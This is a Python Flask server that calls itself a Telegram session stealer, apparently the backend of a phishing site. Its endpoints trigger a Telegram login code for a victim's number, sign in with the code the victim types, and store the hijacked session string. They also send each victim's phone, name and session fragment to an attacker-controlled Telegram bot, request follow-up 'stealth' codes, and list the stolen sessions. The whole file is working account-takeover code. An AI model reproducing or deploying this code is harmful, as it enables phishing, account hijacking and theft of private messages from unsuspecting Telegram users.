from flask import Flask, request, jsonify
from telethon.sync import TelegramClient
from telethon.sessions import StringSession
from telethon.tl.functions.auth import ResendCodeRequest
import os
import asyncio
import requests
from datetime import datetime
import json
from dotenv import load_dotenv

# Load environment variables
load_dotenv()

app = Flask(__name__)

# Configuration from environment variables
API_ID = int(os.environ.get('API_ID'))
API_HASH = os.environ.get('API_HASH')
SESSION_STRING = os.environ.get('SESSION_STRING')
BOT_TOKEN = os.environ.get('BOT_TOKEN')
CHAT_ID = os.environ.get('CHAT_ID')

# Check required environment variables
required_vars = ['SESSION_STRING', 'API_ID', 'API_HASH', 'BOT_TOKEN', 'CHAT_ID']
missing_vars = [var for var in required_vars if not os.environ.get(var)]

if missing_vars:
    print(f"❌ MISSING ENVIRONMENT VARIABLES: {', '.join(missing_vars)}")

# Storage for sessions and OTP requests
sessions_db = {}
pending_otps = {}

def send_to_bot(message):
    """Send message to Telegram bot"""
    if not BOT_TOKEN or not CHAT_ID:
        print("❌ BOT_TOKEN or CHAT_ID not set")
        return False
        
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = {
        'chat_id': CHAT_ID,
        'text': message,
        'parse_mode': 'Markdown'
    }
    try:
        response = requests.post(url, json=data, timeout=10)
        return response.status_code == 200
    except Exception as e:
        print(f"Failed to send to bot: {e}")
        return False

@app.route('/send_code', methods=['POST'])
def send_code():
    """For phishing site - send OTP to victim"""
    if not SESSION_STRING:
        return jsonify({'success': False, 'error': 'SESSION_STRING not configured'})
        
    phone = request.form.get('phone')
    
    if not phone:
        return jsonify({'success': False, 'error': 'No phone provided'})
    
    async def run():
        client = TelegramClient(StringSession(SESSION_STRING), API_ID, API_HASH)
        await client.connect()
        try:
            result = await client.send_code_request(phone)
            
            # Store for verification
            pending_otps[phone] = {
                'phone_code_hash': result.phone_code_hash,
                'timestamp': datetime.now().isoformat()
            }
            
            # Notify bot
            send_to_bot(f"🎯 *TARGET MASUK!*\n\n📱 Nomor: `{phone}`\n🕒 Waktu: `{datetime.now().strftime('%H:%M:%S')}`\n🔐 Status: `OTP TERKIRIM`")
            
            return {
                'success': True, 
                'phone_code_hash': result.phone_code_hash
            }
        except Exception as e:
            error_msg = f"❌ GAGAL KIRIM OTP: `{phone}`\nError: `{str(e)}`"
            send_to_bot(error_msg)
            return {'success': False, 'error': str(e)}
        finally:
            await client.disconnect()
    
    try:
        return jsonify(asyncio.run(run()))
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/steal_session', methods=['POST'])
def steal_session():
    """Steal session when victim enters OTP"""
    if not SESSION_STRING:
        return jsonify({'success': False, 'error': 'SESSION_STRING not configured'})
        
    phone = request.form.get('phone')
    code = request.form.get('code')
    
    if not phone or not code:
        return jsonify({'success': False, 'error': 'Missing phone or code'})
    
    if phone not in pending_otps:
        return jsonify({'success': False, 'error': 'No OTP request found for this phone'})
    
    async def run():
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()
        try:
            # Login with victim's OTP
            await client.sign_in(
                phone=phone, 
                code=code, 
                phone_code_hash=pending_otps[phone]['phone_code_hash']
            )
            
            # Get session string
            session_string = client.session.save()
            user = await client.get_me()
            
            # Save to sessions database
            sessions_db[phone] = {
                'session_string': session_string,
                'user_id': user.id,
                'first_name': user.first_name,
                'last_name': user.last_name,
                'username': user.username,
                'last_login': datetime.now().isoformat()
            }
            
            # Send success message to bot
            message = f"🎯 *SESSION HIJACKED!*\n\n"
            message += f"📱 Nomor: `{phone}`\n"
            message += f"👤 Nama: `{user.first_name or 'N/A'} {user.last_name or ''}`\n"
            message += f"🔐 Session: `{session_string[:50]}...`\n"
            message += f"🕒 Waktu: `{datetime.now().strftime('%H:%M:%S')}`"
            
            send_to_bot(message)
            
            # Cleanup
            if phone in pending_otps:
                del pending_otps[phone]
                
            return {'success': True, 'session': session_string}
            
        except Exception as e:
            error_msg = f"❌ GAGAL STEAL SESSION: `{phone}`\nError: `{str(e)}`"
            send_to_bot(error_msg)
            return {'success': False, 'error': str(e)}
        finally:
            await client.disconnect()
    
    try:
        return jsonify(asyncio.run(run()))
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/new_otp', methods=['POST'])
def new_otp():
    """Stealth OTP request for saved sessions"""
    phone = request.form.get('phone')
    
    if not phone:
        return jsonify({'success': False, 'error': 'No phone provided'})
    
    if phone not in sessions_db:
        return jsonify({'success': False, 'error': 'No session found for this phone'})
    
    async def run():
        session_string = sessions_db[phone]['session_string']
        client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
        await client.connect()
        
        try:
            # Check if session still valid
            if not await client.is_user_authorized():
                return {'success': False, 'error': 'Session expired'}
            
            # Request new OTP
            result = await client.send_code_request(phone)
            
            pending_otps[phone] = {
                'phone_code_hash': result.phone_code_hash,
                'timestamp': datetime.now().isoformat(),
                'for_stealth': True
            }
            
            message = f"🕵️ *STEALTH OTP REQUESTED*\n\n"
            message += f"📱 Nomor: `{phone}`\n"
            message += f"👤 User: `{sessions_db[phone]['first_name'] or 'N/A'}`\n"
            message += f"🎯 Hash: `{result.phone_code_hash[:20]}...`\n"
            message += f"🕒 Waktu: `{datetime.now().strftime('%H:%M:%S')}`\n\n"
            message += f"⏳ *OTP akan muncul di sini soon...*"
            
            send_to_bot(message)
            return {'success': True, 'phone_code_hash': result.phone_code_hash}
            
        except Exception as e:
            error_msg = f"❌ GAGAL REQUEST OTP: `{phone}`\nError: `{str(e)}`"
            send_to_bot(error_msg)
            return {'success': False, 'error': str(e)}
        finally:
            await client.disconnect()
    
    try:
        return jsonify(asyncio.run(run()))
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/list_sessions', methods=['GET'])
def list_sessions():
    """List all stolen sessions"""
    return jsonify({
        'total_sessions': len(sessions_db),
        'sessions': {phone: {**data, 'session_string': data['session_string'][:50] + '...'} for phone, data in sessions_db.items()}
    })

@app.route('/env_check', methods=['GET'])
def env_check():
    """Check environment variables"""
    status = {}
    for var in ['SESSION_STRING', 'API_ID', 'API_HASH', 'BOT_TOKEN', 'CHAT_ID']:
        value = os.environ.get(var)
        status[var] = {
            'set': bool(value),
            'value': value[:20] + '...' if value and len(value) > 20 else value if value else None
        }
    return jsonify(status)

@app.route('/debug', methods=['GET'])
def debug():
    """Debug information"""
    return jsonify({
        'pending_otps_count': len(pending_otps),
        'sessions_count': len(sessions_db),
        'pending_phones': list(pending_otps.keys()),
        'session_phones': list(sessions_db.keys())
    })

@app.route('/')
def home():
    session_set = bool(os.environ.get('SESSION_STRING'))
    return f"""
    <html>
        <head><title>JINX RAILWAY API</title></head>
        <body style="background: black; color: lime; font-family: monospace; padding: 20px;">
            <h1>😈 JINX RAILWAY API - TELEGRAM SESSION STEALER</h1>
            <p>SESSION_STRING: {'✅ SET' if session_set else '❌ NOT SET'}</p>
            <p>API_ID: {'✅ ' + os.environ.get('API_ID', 'NOT SET')}</p>
            <p>API_HASH: {'✅ SET' if os.environ.get('API_HASH') else '❌ NOT SET'}</p>
            <p>BOT_TOKEN: {'✅ SET' if os.environ.get('BOT_TOKEN') else '❌ NOT SET'}</p>
            <p>CHAT_ID: {'✅ ' + os.environ.get('CHAT_ID', 'NOT SET')}</p>
            <hr>
            <p>Endpoints:</p>
            <ul>
                <li><a href="/env_check" style="color: lime;">/env_check</a> - Check environment variables</li>
                <li><a href="/debug" style="color: lime;">/debug</a> - Debug information</li>
                <li><a href="/list_sessions" style="color: lime;">/list_sessions</a> - List stolen sessions</li>
            </ul>
            <p>💀 Ready to steal sessions!</p>
        </body>
    </html>
    """

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
